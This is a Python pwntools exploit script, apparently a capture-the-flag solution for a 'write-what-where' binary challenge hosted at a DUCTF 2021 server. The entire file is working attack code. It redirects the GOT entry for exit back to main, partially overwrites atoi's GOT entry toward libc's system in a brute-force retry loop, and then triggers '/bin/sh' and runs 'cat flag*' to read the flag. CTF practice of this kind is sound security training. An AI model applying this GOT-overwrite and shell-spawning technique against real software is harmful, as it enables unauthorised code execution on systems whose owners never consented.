#!/usr/bin/python3
from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:  # GDB NOASLR
		context.terminal = ["/mnt/c/wsl_terminal/wsl-terminal/open-wsl.exe", "-e"]
		return gdb.debug(['./write-what-where_patched'] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote('pwn-2021.duc.tf', 31920, *a, **kw)
	else:  # Run locally
		return process(['./ld-2.33.so', '--preload', './libc.so.6', exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main
b *main+33
b *main+122
b *main+150
continue
'''.format(**locals())

exe = './write-what-where'
elf = context.binary = ELF(exe, checksec=False)
# warning/info/debug
context.log_level = 'info'

while(1):
  try:
    io = start()
    # got.exit -> main
    io.sendafter(b'what?\n', p32(elf.sym.main))
    io.sendlineafter(b'where?\n', bytes(str(elf.got.exit), 'utf-8'))
    '''
    libc_atoi_offset   = 0x421f0
    libc_system_offset = 0x4fa60
    '''
    # write 2 byte in got.atoi
    io.sendafter(b'what?\n', b'\x00\x00\x60\xfa')
    io.sendlineafter(b'where?\n', bytes(str(elf.got.atoi - 2), 'utf-8'))

    io.sendafter(b'what?\n', b'pwn!')
    io.sendlineafter(b'where?\n', b'/bin/sh\x00')

    # try get flag
    io.sendline(b'cat flag*')
    msg = io.recvline()
    print(msg)
    if(b'stack smashing detected' in msg):
      io.close()
      continue
    break
  except:
    print('false')
  io.close()